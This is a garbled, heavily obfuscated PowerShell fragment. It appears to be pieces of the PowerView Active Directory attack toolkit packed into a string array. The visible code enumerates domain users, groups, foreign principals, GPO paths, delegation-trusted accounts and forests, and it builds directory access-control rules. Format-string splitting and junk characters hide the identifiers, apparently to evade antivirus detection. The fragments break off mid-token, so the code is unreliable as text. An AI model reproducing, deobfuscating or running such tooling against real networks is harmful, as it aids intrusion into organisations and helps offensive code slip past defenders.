                            }

                            
  ','Z3b-f S5zrIAS5z,S5zbLeS5z,S5zVaS5z)  JFI).Z3bvAIJKlueZ3b::Z3beMPIJKTYZ3b
    )

    PROCESS {
        ForEach (YoV{CIJKOMpUIJKTer} in YoV{cOIJKmPIJKUIJKTerIJKNaMe}) {
            try {
                YoV{WIJKmIJKIaIJKRGUmEIJKNtS} = @{
                    (Z3b{1}{0}Z3b-fS5zistS5z,S5zLS5z) = YoV{TIJKRue}
                    (Z3b{0}{1}Z3b -f S5zClaS5z,S5zssS5z) = (Z3b{0}{1}{2}Z3b-fS5zStdRegPrS5z,S5zoS5z,S5zvS5z)
                    (Z3b{1}{0}Z3b-fS5zaceS5z,S5zNamespS5z) = (((Z3b{0}{2}{1}Z3b -f S5zroS5z,S5zaultS5z,S5zot{0}defS5z)) -F  [char]92)
                    (Z3b{2}{3}{0}{1}Z3b-fS5zamS5z,S5zeS5z,S5zComputerS5z,S5znS5z) = YoV{cOmPUIJKTIJKer}
                    (Z3b{1}{2}{3}{0}Z3b-fS5zonS5z,S5zErrS5z,S5zorS5z,S5zActiS5z) = (Z3b{0}{1}Z3b-fS5zStoS5z,S5zpS5z)
                }
                if (YoV{PSboIJKUNdIJKParIJKAMETeRs}[(Z3b{1}{2}{0}{3}Z3b -fS5zntiS5z,S5zCS5z,S5zredeS5z,S5zalS5z)]) { YoV{wMiIJKAIJKRGuIJKmEIJKNtS}[(Z3b{2}{1}{3}{0}Z3b -fS5zlS5z,S5zedenS5z,S5zCrS5z,S5ztiaS5z)] = YoV{CrEdIJKEntIJKiIJ','       YoV{gIJKROUIJKPIJKMembeR} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdd-MS5z,S5zrS5z,S5zembeS5z) (Z3b{3}{1}{0}{2}Z3b -f S5zpS5z,S5zroS5z,S5zertyS5z,S5zNotepS5z) (Z3b{1}{0}{2}Z3b -f S5zDomaiS5z,S5zGroupS5z,S5znS5z) YoV{GrouPfoIJKUNDIJKDoMaIJKiN}
                    YoV{GROUIJKpIJKmEmIJKBEr} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdS5z,S5zd-MS5z,S5zemberS5z) (Z3b{2}{0}{1}Z3b -fS5zepropertS5z,S5zyS5z,S5zNotS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zpNS5z,S5zameS5z,S5zGrS5z,S5zouS5z) YoV{GroIJKUPfOUIJKNIJKDNAmE}
                    YoV{GrouIJKPmIJKEMber} JGO &(Z3b{3}{1}{2}{0}Z3b -fS5zrS5z,S5zMembS5z,S5zeS5z,S5zAdd-S5z) (Z3b{1}{0}{2}Z3b -f S5zoteprS5z,S5zNS5z,S5zopertyS5z) (Z3b{2}{4}{3}{1}{0}{5}Z3b -fS5zinguishedS5z,S5ztS5z,S5zGS5z,S5zupDisS5z,S5zroS5z,S5zNameS5z) YoV{gRIJKoUIJKPfoUndDn}

                    if (YoV{PrIJKOPErtIIJKES}.Z3boIJKBJECIJKTSIdZ3b) {
                        YoV{mIJKembIJKersId} = ((&(Z3b{0}{1}{2}Z3b -f S5zNew-ObjeS5z,S5zcS5z,S5ztS5z) (Z3b{5}{8}{9}{7}{0}{2}{3}{4}{1}{6}Z3b -fS5zcS5z,S5zecurityIdeS5z,S5ziS5z,S5zpS5z,S5zal.SS5z,S5zSystem.SS5z,S5zntifierS5z,S5zity.PrinS5z,S5zecuS5z,S5zrS5z) YoV{pRIJKOperIJKTiES}.Z3boIJKBjectIJKSidZ3b[0], 0).Z3bVAIJKlueZ3b)
                    }
                    else {
                        YoV{MemBeIJKRSIJKId} = YoV{nIJKULL}
                    }

                    try {
                        YoV{meMIJKBIJKErdn} = YoV{prOIJKpeIJKRTIES}.Z3bdIJKIstIJKINgUIJKiSheDIJKNAmeZ3b[0]
                        if (YoV{MEMBIJKeIJKRIJKDn} -match (((Z3b{1}{4}{2}{0}{5}{7}{3}{6}Z3b-fS5ztyPrincipals8owS-S5z,S5zFS5z,S5zriS5z,S5z5S5z,S5zoreignSecuS5z,S5z1S5z,S5z-21S5z,S5z-S5z)).Z3bREplIJKAIJKceZ3b(S5z8owS5z,[sTRIng][CHAr]124))) {
                            try {
                                if (-not YoV{mEmIJKBIJKerSiD}) {
                                    YoV{MEIJKmBEIJKRSIJKiD} = YoV{PIJKRoPertIJKiIJKEs}.Z3bCIJKNZ3b[0]
                                }
                                YoV{mIJKEMbEIJKRsimpIJKLENAIJKMe} = &(Z3b{1}{0}{2}Z3b-f S5zvert-S5z,S5zConS5z,S5zADNameS5z) -Identity YoV{memBEIJKRIJKsIJKid} -OutputType (Z3b{2}{3}{0}{1}Z3b -f S5zSiS5z,S5zmpleS5z,S5zDS5z,S5zomainS5z) @ADNameArguments

                                if (YoV{mIJKEIJKMBeIJKRsIMplIJKEnaIJKMe}) {
                                    YoV{MIJKemBERdIJKomaIJKiN} = YoV{MEmIJKBEIJKRSiIJKmIJKpIJKlEnAme}.(Z3b{0}{1}Z3b-f S5zSpliS5z,S5ztS5z).Invoke(S5z@S5z)[1]
                                }
                                else {
                                    &(Z3b{0}{1}{2}{3}Z3b-fS5zWS5z,S5zrite-S5z,S5zWarS5z,S5zningS5z) (S5z[GS5z+S5zet-S5z+S5zDo','ateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b-f S5zSPS5z,S5zADS5z,S','inUsS5z+S5zer]S5z+S5z S5z+S5zES5z+S5zxtractedS5z+S5z S5z+S5zdS5z+S5zomainS5z+S5z S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfrS5z+S5zom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{sEaIJKRchIJKeIJKRArGIJKUmeNts}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)] = YoV{idENTIIJKTyDIJKoIJKMIJKAin}
                        YoV{uSIJKeIJKRSIJKEARcher} = &(Z3b{0}{1}{3}{4}{2}Z3b -fS5zGeS5z,S5ztS5z,S5zmainSearcherS5z,S5z-DS5z,S5zoS5z) @SearcherArguments
                        if (-not YoV{USerSeIJKARIJKCHIJKeR}) {
                            &(Z3b{1}{3}{0}{4}{2}Z3b-fS5ze-WaS5z,S5zWS5z,S5zgS5z,S5zritS5z,S5zrninS5z) (S5z[S5z+S5zGeS5z+S5zt-DS5z+S5zoS5z+S5zmainUser] S5z+S5zUnablS5z+S5ze S5z+S5ztS5z+S5zo S5z+S5zretrS5z+S5zieS5z+S5zvS5z+S5ze S5z+S5zdoS5z+S5zmaiS5z+S5zn S5z+S5zsearS5z+S5zcheS5z+S5zr S5z+S5zforS5z+S5z S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                elseif (YoV{iIJKdENIJKTITyiIJKNstaNCE} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                    YoV{gIJKUiIJKDbYTeIJKsIJKTriNg} = (([Guid]YoV{IDEIJKNTIJKIIJKTyinsTIJKANcE}).(Z3b{0}{1}{2}Z3b-f S5zTS5z,S5zoByS5z,S5zteArrayS5z).Invoke() JGO &(Z3b{1}{2}{3}{0}Z3b-fS5ztS5z,S5zFoS5z,S5zrEachS5z,S5z-ObjecS5z) { S5z5rjS5z + YoV{_}.(Z3b{2}{1}{0}Z3b -f S5zgS5z,S5zStrinS5z,S5zToS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                    YoV{iDEnTItIJKyIJKFilIJKTer} += Z3b(objectguid=YoVGuidByteString)Z3b
                }
                elseif (YoV{IdENTIJKiTyIJKinIJKsTIJKAncE}.(Z3b{1}{0}Z3b -f S5zntainsS5z,S5zCoS5z).Invoke(S5z5rjS5z)) {
                    YoV{cOnVErTEIJKDIIJKdIJKeIJKNtiIJKTIJKYinstAnCE} = YoV{iDeIJKNtitYinIJKStanIJKCe}.(Z3b{1}{0}Z3b -f S5zaceS5z,S5zReplS5z).Invoke(S5z5rj28S5z, S5z(S5z).(Z3b{0}{2}{1}Z3b -fS5zRS5z,S5zceS5z,S5zeplaS5z).Invoke(S5z5rj29S5z, S5z)S5z) JGO &(Z3b{0}{1}{2}{3}Z3b-f S5zCS5z,S5zonS5z,S5zvert-ADNaS5z,S5zmeS5z) -OutputType (Z3b{0}{1}{2}Z3b -fS5zCanoS5z,S5zniS5z,S5zcalS5z)
                    if (YoV{coNIJKVERTEDideIJKNtIJKITIJKyInstAIJKNcE}) {
                        YoV{UsIJKERdIJKoIJKMAin} = YoV{CoIJKNVerTeDIJKidIJKEntitIJKyInIJKSTIJKAIJKNCE}.(Z3b{0}{1}Z3b -f S5zSubStriS5z,S5zngS5z).Invoke(0, YoV{cOnveRTIJKEdIDEIJKNIJKTiIJKTyInIJKSTANcE}.(Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zIndS5z,S5zxOfS5z).Invoke(S5z/S5z))
                        YoV{useIJKRnIJKAME} = YoV{IIJKDENTiIJKTIJKyiNsIJKTancE}.(Z3b{0}{1}Z3b -fS5zSS5z,S5zplitS5z).Invoke(S5z5rjS5z)[1]
                        YoV{iIJKdeNtityfiIJKltER} += Z3b(samAccountName=YoVUserName)Z3b
                        YoV{seArCHeraRGIJKUmIJKeNIJKTS}[(Z3b{0}{1}Z3b -fS5zDoS5z,S5zmainS5z)] = YoV{UIJKSErDIJKoMaIn}
                        &(Z3b','rIdS5z)]) { YoV{uIJKseIJKRSeARIJKCIJKhEraRIJKgumEIJKNts}[(Z3b{1}{0}{2}Z3b-fS5zdentitS5z,S5zIS5z,S5zyS5z)] = YoV{uSEIJKRIDeNIJKTIJKIIJKTy} }
        if (YoV{PIJKsBoUNdpIJKAraIJKmeTIJKERS}[(Z3b{0}{1}Z3b-fS5zDomS5z,S5zainS5z)]) { YoV{USErSEaIJKRCHERAIJKRIJKGIJKUmIJKeNIJKTs}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)] = YoV{dIJKomAIJKIN} }
        if (YoV{psBOIJKUIJKNIJKDpaRIJKAmEters}[(Z3b{2}{1}{0}Z3b -f S5zinS5z,S5zerDomaS5z,S5zUsS5z)]) { YoV{uSERsEaRcHErIJKArIJKGUMIJKeIJKNTs}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)] = YoV{USEIJKRdIJKoIJKMAiN} }
        if (YoV{PIJKsbIJKoUnDPARIJKAIJKMeTers}[(Z3b{2}{1}{0}{3}Z3b -fS5ztS5z,S5zLDAPFi','     [uint32](Z3b{2}{1}{0}Z3b-f S5z0S5z,S5z020S5z,S5z0x0000S5z) = (Z3b{1}{3}{5}{6}{0}{2}{9}{8}{4}{7}Z3b-fS5zNOS5z,S5zCRS5z,S5z_TGT_DELS5z,S5zOSS_ORGANIZS5z,S5zIOS5z,S5zATIOS5z,S5zN_S5z,S5zNS5z,S5zATS5z,S5zEGS5z)
            [uint32](Z3b{0}{2}{1}Z3b-fS5z0x000S5z,S5z0400S5z,S5z0S5z) = (Z3b{2}{1}{0}Z3b-f S5zUSTS5z,S5zRS5z,S5zPIM_TS5z)
        }

        YoV{lDaIJKpSIJKEaRChIJKErARGUMenTs} = @{}
        if (YoV{PsIJKBOUNDPaRaIJKMIJKETErs}[(Z3b{0}{1}Z3b-f S5zDomaS5z,S5zinS5z)]) { YoV{lDAPIJKsEARcHerAIJKRguIJKmIJKEnts}[(Z3b{2}{0}{1}Z3b -f S5zmS5z,S5zainS5z,S5zDoS5z)] = YoV{DoMIJKAIJKIN} }
        if (YoV{pIJKSBouIJKNdPaIJKRaMeTIJKERs}[(Z3b{1}{2}{0}Z3b-f S5zlterS5z,S5zLDAS5z,S5zPFiS5z)]) { YoV{ldaPSeArIJKcHIJKEIJKRaRIJKguMEntS}[(Z3b{0}{2}{1}Z3b-f S5zLDAPFiS5z,S5zterS5z,S5zlS5z)] = YoV{ldIJKApfIIJKLIJKTEr} }
        if (YoV{pSIJKBounIJKdparaIJKmetIJKERS}[(Z3b{3}{0}{1}{2}Z3b-fS5zropeS5z,S5zrtiS5z,S5zesS5z,S5zPS5z)]) { YoV{ldApseARCh','objecT}.Z3bpSzaTtRIJKiButEIJKNIJKAMEZ3b -Match YoV{pIJKRoPerIJKTyIJKFIlTer}) {
                        YoV','{1}Z3b-f S5zGS5z,S5zherS5z,S5zearcS5z,S5zet-DomainSS5z) @LdapSearcherArguments
            YoV{sIJKoIJKUrcESIJKId} = &(Z3b{1}{0}{2}Z3b -fS5zomainSS5z,S5zGet-DS5z,S5zIDS5z) @NetSearcherArguments

            if (YoV{TrIJKUsIJKTSEIJKArchIJKeR}) {

                YoV{TrUsTIJKseAIJKRCIJKheR}.Z3bFIJKILtIJKERZ3b = (Z3b{0}{2}{4}{','5z
                                YoV{GPcfIJKilEsIJKYSPAIJKTh} = Z3b5rj5rjYoVGPODomain5rjSysVol5rjYoVGPODomain5rjPolicies5rjYoV(YoVGPO.cn)Z3b
                                YoV{GIJKPO} JGO &(Z3b{0}{2}{1}Z3b-f S5zAS5z,S5zerS5z,S5zdd-MembS5z) (Z3b{2}{3}{0}{1}Z3b-f S5zrS5z,S5zopertyS5z,S5zNoteS5z,S5zpS5z) (Z3b{3}{2}{1}{0}Z3b-fS5zspathS5z,S5zfilesyS5z,S5zcS5z,S5zgpS5z) YoV{GpCfILIJKEIJKsYSIJKpIJKATh}
        ','ziS5z,S5zsposeS5z,S5zdS5z).Invoke()
        }
    }
}


function gIJKEt-dOIJKmAIIJKNSITE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{2}{1}{0}Z3b-f S5zldProcessS5z,S5zhouS5z,S5zSS5z,S5zPSS5z}, S5zS5z)]
    [OutputType({Z3b{1}{2}{0}{3}{4}Z3b -fS5z.SiS5z,S5zPoweS5z,S5zrViewS5z,S5ztS5z,S5zeS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSiTiO','JKmE} = (Z3b{0}{2}{3}{1}Z3b -fS5zAdminS5z,S5zsS5z,S5ziS5z,S5zstratorS5z),

        [ValidateSet(S5zAPIS5z, {Z3b{1}{0}Z3b -f S5zTS5z,S5zWinNS5z})]
        [Alias({Z3b{4}{1}{0}{2}{3}Z3b -fS5zectionS5z,S5zllS5z,S5zMeS5z,S5zthodS5z,S5zCoS5z})]
      ','S5z).Invoke(0, (Z3b{0}{3}{4}{6}{1}{2}{5}Z3b -fS5zPowerS5z,S5z.PrS5z,S5zoxySettinS5z,S5zVS5z,S5ziS5z,S5zgsS5z,S5zewS5z))
                    YoV{oIJKUt}
                }
                else {
                    &(Z3b{1}{0}{2}{3}Z3b -fS5ze-WarS5z,S5zWritS5z,S5znS5z,S5zingS5z) (S5z[S5z+S5zGet-WMS5z+S5zIRegProS5z+S5zxy]S5z+S5z S5z+S5zNoS5z+S5z S5z+S5zproS5z+S5zxS5z+S5zy S5z+S5zsettS5z+S5zingsS5z+S5z S5z+S5zfS5z+S5zound S5z+S5zfS5z+S5zor S5z+Z3bYoVComputerNameZ3b)
                }
            }
            catch {
                &(Z3b{1}{3}{2}{0}Z3b -f S5zgS5z,S5zWrite-WS5z,S5zinS5z,S5zarnS5z) (S5z[Get-WMS5z+S5zIRS5z+S5zeS5z+S5zgPrS5z+S5zoxy] S5z+S5zErS5z+S5zror S5z+S5zenS5z+S5zumS5z+S5zeratiS5z+S5zng S5z+S5zpS5z+S5zroxS5z+S5zy S5z+S5zsS5z+S5zettS5z+S5zings S','2}{3}Z3b -fS5zDomainContS5z,S5zrS5z,S5zlS5z,S5zlerS5z,S5zoS5z})]
        [String]
        YoV{sEIJKRvEr},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBaS5z,S5zseS5z}, {Z3b{1}{0}Z3b-f S5zlS5z,S5zOneLeveS5z}, {Z3b{0}{1}Z3b-f S5zSubS5z,S5ztreeS5z})]
        [String]
        YoV{SeIJKARchSIJKcoPe} = (Z3b{2}{1}{0}Z3b-f S5zeeS5z,S5zubtrS5z,S5zSS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{reSuI','IJKUAcvALUIJKeS}.(Z3b{1}{0}Z3b -fS5zdS5z,S5zAdS5z).Invoke(YoV{UAIJKCvAIJKLUe}.Z3bnaIJKmEZ3b, Z3bYoV(YoVUACValue.Value)+Z3b)
                }
                else {
                    YoV{REsUlTUACvAIJKLIJKUES}.(Z3b{1}{0}Z3b -fS5zddS5z,S5zAS5z).Invoke(YoV{UaIJKcvaLIJKUE}.Z3bnIJKAMeZ3b, Z3bYoV(YoVUACValue.Value)Z3b)
                }
            }
        }
        else {
            ForEach (YoV{UIJKAcvalIJKUE} in YoV{uIJKACIJKVAluEs}.(Z3b{1}{2}{3}{0}Z3b -fS5zratorS5z,S5zGS5z,S5zetEnumS5z,S5zeS5z).Invoke()) {
                if ( (YoV{vIJKAIJKLUE} -band YoV{uIJKACIJKVaLUE}.Z3bvIJKALUeZ3b) -eq YoV{UACIJKVAlIJKUe}.Z3bVaLIJKUeZ3b) {
                    YoV{reSIJKUIJKLTUIJKACIJKVaLuES}.(Z3b{0}{1}Z3b -f S5zAS5z,S5zddS5z).Invoke(YoV{UaIJKCVIJKAIJKLUE}.Z3bNaIJKmeZ3b, Z3bYoV(YoVUACValue.Value)Z3b)
                }
            }
        }
        YoV{rEIJKsIJKULtUACVIJKAIJKlUes}
    }
}


function gIJKeT-IJKprIIJKNcipaLCIJKOntEIJKXt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{4}{0}{1}{3}Z3b -fS5zldS5z,S5zProceS5z,S5zPSSS5z,S5zssS5z,S5zhouS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIon = 0, MAndaTory = YoV{tIJKRUe})]
        [Alias({Z3b{0}{2}{1}Z3b-f S5zGroupS5z,S5zameS5z,S5zNS5z}, {Z3b{2}{1}{0}Z3b-f S5zoupIdentityS5z,S5zrS5z,S5zGS','ring]
        YoV{SeaIJKRcIJKHscoIJKpe} = (Z3b{1}{0}Z3b-f S5zeS5z,S5zSubtreS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ResUlIJKTPAGIJKeSIJKiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKEIJKRveIJKRtImIJKeLImIT},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zDacS5z,S5zlS5z}, {Z3b{0}{1}Z3b -f S5zGrS5z,S5zoupS5z}, {Z3b{1}{0}Z3b -fS5zneS5z,S5zNoS5z}, {Z3b{0}{1}Z3b -f S5zOwneS5z,S5zrS5z}, {Z3b{1}{0}Z3b -f S5zlS5z,S5zSacS5z})]
        [String]
        YoV{SecURIIJKTIJKyMIJKAskS},

        [Switch]
        YoV{tombIJKSIJKToNE},

        [Alias({Z3b{0}{1}{2}Z3b -fS5zReS5z,S5zturnS5z,S5zOneS5z})]
        [Switch]
        YoV{FiIJKNdone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKRIJKEDEntIJKial} =  ( &(Z3b{0}{3}{2}{1}Z3b -f S5zGS5z,S5zemS5z,S5z-ChIldItS5z,S5zeTS5z)  VarIABLE:JfI ).Z3bVAlIJKUEZ3b::Z3bemIJKPTYZ3b,

        [Switch]
        YoV{RIJKAw}
    )

    DynamicParam {
        YoV{uaIJKcValuIJKeNames} =   YoV{4IJKx0}::(Z3b{1}{0}Z3b-fS5zmesS5z,S5zGetNaS5z).Invoke(YoV{uIJKACEIJKNUM})
        
        YoV{UaIJKCValUeIJKNIJKAIJKMES} = YoV{UIJKAIJKCVIJKALUENAIJKMEs} JGO &(Z3b{0}{3}{1}{2}Z3b -fS5zForEachS5z,S5zObS5z,S5zjectS5z,S5z-S5z) {YoV{_}; Z3bNOT_YoV_Z3b}
        
        &(Z3b{4}{0}{1}{3}{2}{5}Z3b -f S5z-DynaS5z,S5zmicParS5z,S5zteS5z,S5zameS5z,S5zNewS5z,S5zrS5z) -Name (Z3b{1}{3}{2}{0}Z3b-f S5zerS5z,S5zUAS5z,S5ztS5z,S5zCFilS5z) -ValidateSet YoV{uIJKACIJKVIJKAluIJKENames} -Type ([array])
    }

    BEGIN {
        YoV{SIJKeArChIJKerIJKARgUmEIJKNTs} = @{}
        if (YoV{pIJKsboUnIJKDIJKParAMEteIJKRS}[(Z3b{2}{0}{1}Z3b-f S5zomS5z,S5zainS5z,S5zDS5z)]) { YoV{SEAIJKRIJKcHErArGIJKUmENTS}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)] = YoV{d',' S5z+S5ztS5z+S5zo S5z+S5zretrieveS5z+S5z S5z+S5zdomaiS5z+S5zn S5z+S5zseaS5z+S5zrS5z+S5zcher S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                elseif (YoV{iDIJKEIJKNTitIJKYiNSTIJKANCe} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                    YoV{guIIJKDbyteIJKsTRIJKINg} = (([Guid]YoV{IIJKDIJKENtIJKiTYiNstancE}).(Z3b{0}{1}{2}Z3b -fS5zToBS5z,S5zyteArrS5z,S5zayS5z).Invoke() JGO &(Z3b{2}{1}{4}{0}{3}Z3b-fS5zbjecS5z,S5zorEachS5z,S5zFS5z,S5ztS5z,S5z-OS5z) { S5z5rjS5z + YoV{_}.(Z3b{0}{1}{2}Z3b -f S5zToSS5z,S5ztrS5z,S5zingS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                    YoV{iIJKDeNIJKTiIJKTyFiIJKlTER} += Z3b(objectguid=YoVGuidByteString)Z3b
                }
                elseif (YoV{iDIJKENIJKTItYIJKiNsTaNIJKCE}.(Z3b{1}{2}{0}Z3b -fS5zinsS5z,S5zCS5z,S5zontaS5z).Invoke(S5z5rjS5z)) {
                    YoV{convERIJKTeIJKDIDeNtIJKItIJKyIIJKNIJKstAnce} = YoV{iDEnTIIJKTYiIJKNSIJKTIJKAnIJKCE}.(Z3b{1}{0}Z3b-fS5zceS5z,S5zReplaS5z).Invoke(S5z5rj28S5z, S5z(S5z).(Z3b{1}{0}{2}Z3b-fS5zcS5z,S5zReplaS5z,S5zeS5z).Invoke(S5z5rj29S5z, S5z)S5z) JGO &(Z3b{2}{4}{0}{3}{1}Z3b -fS5zrtS5z,S5zADNameS5z,S5zCoS5z,S5z-S5z,S5znveS5z) -OutputType (Z3b{1}{2}{0}Z3b-fS5zicalS5z,S5zCanS5z,S5zonS5z)
                    if (YoV{cOnVErIJKTeDIJKIDeNTIJKitIJKyinSIJKTAnCe}) {
                        YoV{OIJKBjEIJKCtDOMAIN} = YoV{cOnVIJKEIJKRIJKTedIdENtIJKityIIJKNsIJKTAnIJKce}.(Z3b{1}{0}{2}Z3b -f S5zbStrinS5z,S5zSuS5z,S5zgS5z).Invoke(','zoseS5z,S5zWrite-S5z) (Z3b{8}{9}{3}{1}{6}{5}{7}{2}{0}{4}Z3b-fS5z deS5z,S5zching S5z,S5zs who can beS5z,S5zarS5z,S5zlegatedS5z,S5zor usS5z,S5zfS5z,S5zerS5z,S5z[Get-DomainUsS5z,S5zer] SeS5z)
                
                YoV{FIIJKLTIJKEr} += (Z3b{0}{3}{5}{4}{7}{6}{1}{2}{8}{9}Z3b -fS5z(!(useS5z,S5z13556.S5z,S5z1S5z,S5zrAccoS5z,S5ztControl:1S5z,S5zunS5z,S5z840.1S5z,S5z.2.S5z,S5z.4.8S5z,S5z03:=1048574))S5z)
            }
            if (YoV{pIJKsBOUnDIJKPARAmIJKeIJKTErs}[(Z3b{0}{3}{1}{4}{5}{2}Z3b-fS5zDisaS5z,S5zloS5z,S5znS5z,S5zlS5z,S5zwDelegatiS5z,S5zoS5z)]) {
                &(Z3b{0}{1}{3}{2}Z3b-fS5zWrS5z,S5zite-VS5z,S5zseS5z,S5zerboS5z) (Z3b{9}{5}{3}{10}{0}{19}{17}{14}{12}{7}{4}{15}{8}{16}{1}{6}{2}{13}{11}{18}Z3b -f S5zr S5z,S5zd S5z,S5zoS5z,S5zUser] Searching S5z,S5zitive aS5z,S5zmainS5z,S5zfS5z,S5zsS5z,S5zot S5z,S5z[Get-DoS5z,S5zfoS5z,S5zegaS5z,S5zare senS5z,S5zr delS5z,S5zs who S5z,S5znd nS5z,S5ztrusteS5z,S5zserS5z,S5ztionS5z,S5zuS5z)
                YoV{fiIJKltEr} += (Z3b{0}{9}{14}{5}{7}{1}{13}{2}{11}{3}{4}{6}{12}{10}{8}{15}Z3b -f S5z(usS5z,S5zrS5z,S5z840.11355S5z,S5z.S5z,S5z4.S5z,S5zonS5z,S5z803S5z,S5ztS5z,S5z04857S5z,S5zerAS5z,S5z=1S5z,S5z6.1S5z,S5z:S5z,S5zol:1.2.S5z,S5zccount','5zServS5z,S5zerTiS5z,S5zitS5z,S5zmeLimS5z)] = YoV{sIJKeIJKRVErTImeliMIJKit} }
        if (YoV{PSbOUNIJKDIJKPIJKAIJKRIJKAMeTErS}[(Z3b{1}{0}Z3b-fS5zneS5z,S5zTombstoS5z)]) { YoV{pRIJKinCiPalIJKsEIJKArcHerAIJKRgUmEnTS}[(Z3b{1}{0}Z3b -f S5zmbstoneS5z,S5zToS5z)] = YoV{TOMIJKBstOIJKNe} }
        if (YoV{pSIJKBIJKOUnDIJKPaRAIJKMEIJKTERs}[(Z3b{0}{2}{3}{1}Z3b-f S5zCS5z,S5zlS5z,S5zredentiS5z,S5zaS5z)]) { YoV{pRinIJKcIJKiPAIJKLSIJKeArCheRIJKArgIJKUMIJKEnTs}[(Z3b{0}{1}{2}Z3b-fS5zCrS5z,S5zedentiS5z,S5zalS5z)] = YoV{CIJKReDEIJKNIJKTIAl} }
        YoV{priIJKNCIJKiPaLS} = &(Z3b{0}{3}{1}{2}Z3b -f S5zGetS5z,S5znObS5z,S5zjectS5z,S5z-DomaiS5z) @PrincipalSearcherArguments
        if (-not YoV{pIJKRInCipIJKAIJKls}) {
            throw (S5zUS5z+S5znableS5z+S5z S5z+S5ztS5z+S5zo S5z+S5zresS5z+S5zolveS5z+S5z S5z+S5zpS5z+S5zrincipal:S5z+S5z S5z+Z3bYoVPrincipalIdentityZ3b)
        }
    }

    PROCESS {
        YoV{TIJKArIJKgeIJKTIJKsearCHERaRgUIJKmEIJKNts}[(Z3b{1}{0}Z3b-f S5ztyS5z,S5zIdentiS5z)] = YoV{TArIJKgEIJKTidEnIJKTiTy}
        YoV{TIJKArgIJKETs} = &(Z3b{0}{2}{1}Z3b-fS5zGeS5z,S5zinObjectS5z,S5zt-DomaS5z) @TargetSearcherArguments

        ForEach (YoV{tIJKARGIJKetIJKObIJKjEcT} in YoV{tIJKARgIJKeTS}) {

            YoV{INhIJKERIJKItanCIJKEtYpE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (Z3b{0}{1}Z3b-fS5zNS5z,S5zoneS5z)
            YoV{CoIJKNtrIJKOLTYPE} = [System.Security.AccessControl.AccessControlType] (Z3b{0}{1}Z3b-f S5zAlloS5z,S5zwS5z)','IJKgUMIJKEIJKNts}[(Z3b{0}{1}{2}Z3b-f S5zCrS5z,S5zedenS5z,S5ztialS5z)] = YoV{cIJKReDEnTiIJKAl} }

        YoV{FIJKoRIJKeStobJECt} = &(Z3b{2}{0}{1}Z3b-fS5zt-FoS5z,S5zrestS5z,S5zGeS5z) @Arguments
        if (YoV{foreStIJKOIJKBIJKjIJKeCt}) {
            YoV{fOREIJKSTobJIJKeCT}.Z3bdOmaIJKIIJKNSZ3b
        }
    }
}


function get-foIJKRestIJKGlIJKOBIJKAIJKlIJKcATalOG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{1}{2}Z3b -f S5zPS5z,S5zuldProceS5z,S5zssS5z,S5zSShoS5z}, S5zS5z)]
    [OutputType({Z3b{3}{11}{0}{1}{4}{5}{6}{12}{9}{8}{2}{7}{10}{13}{14}Z3b-f S5zem.S5z,S5zDiS5z,S5zctorS5z,S5zSysS5z,S5zrS5z,S5zecS5z,S5ztoS5z,S5zy.GS5z,S5zDireS5z,S5zActiveS5z,S5zlobalCS5z,S5ztS5z,S5zryServices.S5z,S5zatS5z,S5zalogS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTiON = 0, VaLuefroMPIpEliNe = YoV{TIJKRue})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{fOIJKReIJKSt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CReIJKDeIJKNIJKTiaL} =  (  &(Z3b{1}{0}Z3b -fS5zTemS5z,S5zIS5z)  VARIaBlE:jfi).Z3bVIJKAlUEZ3b::Z3bEmIJKpTyZ3b
    )

    PROCESS {
        YoV{aIJKRGumIJKeNIJKTs} = @{}
        if (YoV{psbOIJKUnDIJKParaMeIJKTIJKeRs}[(Z3b{1}{0}Z3b -fS5ztS5z,S5zForesS5z)]) { YoV{aRgumIJKeIJKNTs}[(Z3b{0}{2}{1}Z3b -fS5zFS5z,S5zstS5z,S5zoreS5z)] = YoV{FIJKoreIJKsT} }
        if (YoV{pSBOIJKUndparIJKAIJKMIJKEtERS}[(Z3b{1}{2}{0}{3}Z3b-f S5ziaS5z,S5zCreS5z,S5zdentS5z,S5zlS5z)]) { YoV{aRIJKGUmIJKEIJKNTs}[(Z3b{1}{0}{2}Z3b -f S5zedenS5z,S5zCrS5z,S5ztialS5z)] = YoV{CIJKREIJKDIJKeNTiAl} }

        YoV{foIJKRIJKestObJEIJKCT} = &(Z3b{0}{1}{2}Z3b-fS5zGet-FoS5z,S5zrS5z,S5zestS5z) @Arguments

        if (YoV{FOIJKREIJKSToBJeCt}) {
